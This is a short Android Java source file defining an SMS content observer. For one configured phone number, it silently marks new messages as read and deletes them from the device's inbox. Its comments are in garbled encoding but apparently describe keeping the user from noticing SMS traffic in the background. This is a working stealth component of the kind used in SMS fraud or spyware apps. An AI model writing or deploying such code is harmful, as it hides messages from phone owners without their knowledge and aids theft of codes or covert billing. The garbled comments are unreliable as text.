package com.littles.listeners;

import com.littles.utils.UtilSms;

import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;

public class ObserverOnSmsChange extends ContentObserver{

	private String number = "";
	private Context context;
	
	public ObserverOnSmsChange(Handler handler, String number, Context context) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.number = number;
		this.context = context;
	}

	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		try{
			//---�������б仯ʱ��������ָ������Ķ���Ϊ���Ѷ���
			UtilSms.setRead(number, context);
			//---�ٽ�ָ����������ж��ż�¼ɾ����ʹ�û��޷�����ж����ں�̨����
			UtilSms.deleteSms(context, number);
		}catch(Exception e){
			e.printStackTrace();
		}
		
		
	}
	
}
